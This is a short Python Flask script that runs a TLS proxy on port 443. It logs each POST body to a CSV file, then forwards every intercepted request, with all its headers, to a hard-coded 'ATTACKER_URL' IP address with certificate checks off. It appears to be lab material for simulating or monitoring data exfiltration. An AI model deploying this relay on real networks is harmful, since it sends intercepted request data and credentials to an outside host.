# proxy_server.py
from flask import Flask, request
from pathlib import Path
from datetime import datetime
import csv
import urllib3
import requests

app = Flask(__name__)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_DIR = Path(__file__).resolve().parent
CERT_DIR = BASE_DIR / "cert"
LOG_DIR = BASE_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)

PROXY_LOG = LOG_DIR / "proxy.csv"
ATTACKER_URL = "https://52.23.81.119:443/upload_json"

# CSVヘッダ初期化
if not PROXY_LOG.exists():
    with open(PROXY_LOG, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            "timestamp", "src_ip", "dest_ip",
            "domain", "method", "body_bytes", "body",
            "action", "type"
        ])

def forward_to_attacker(req):
    try:
        headers = dict(req.headers)
        body = req.get_data()

        requests.post(
            ATTACKER_URL,
            headers=headers,
            data=body,
            verify=False,   # 自己署名なので必須
            timeout=5
        )
    except Exception as e:
        print(f"[WARN] forward failed: {e}")

@app.route("/upload_json", methods=["POST"])
def upload():
    body = request.get_data()
    src_ip = request.remote_addr

    with open(PROXY_LOG, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            datetime.utcnow().isoformat(),
            src_ip,
            request.host.split(":")[0],
            request.headers.get("Host"),
            request.method,
            len(body),
            body.decode(errors="ignore"),
            "ALLOW",
            "proxy"
        ])

    # ← CSV保存が終わってから転送
    forward_to_attacker(request)

    return "OK", 200


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=443,
        ssl_context=(
            CERT_DIR / "cert.pem",
            CERT_DIR / "key.pem"
        )
    )
